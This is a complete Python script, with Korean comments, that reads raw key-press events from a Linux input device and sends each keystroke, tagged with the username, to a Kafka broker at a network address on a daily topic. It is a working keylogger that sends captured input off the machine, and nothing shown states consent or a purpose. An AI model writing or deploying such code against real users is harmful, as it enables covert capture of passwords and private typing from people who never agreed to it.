#!/usr/bin/python3
from evdev import InputDevice, categorize, ecodes, list_devices
import os
import subprocess
import time
from datetime import datetime

from kafka import KafkaProducer

def input_events(broker, topic, username):
    dev = InputDevice('/dev/input/event2')
    producer = KafkaProducer(bootstrap_servers=[broker]) # 프로듀서 객체 생성

    try:
        for event in dev.read_loop():
            event_str = str(categorize(event))
            if ("key event at" in event_str) and ("down" in event_str):
                user_key_log = event_str + '\t' + str(username)
                producer.send(topic, user_key_log.encode('utf-8'))
                producer.flush() # 메시지 바로 전송
    finally:
        producer.close() # 객체 종료

if __name__ == "__main__":
    username=os.getenv('USER')
    today=datetime.now().strftime('%Y%m%d')
    broker_address = '192.168.56.10:9092' # kafka 브로커 주소
    topic_name = f"key_log_{today}" # 토픽명

    input_events(broker_address, topic_name ,username)
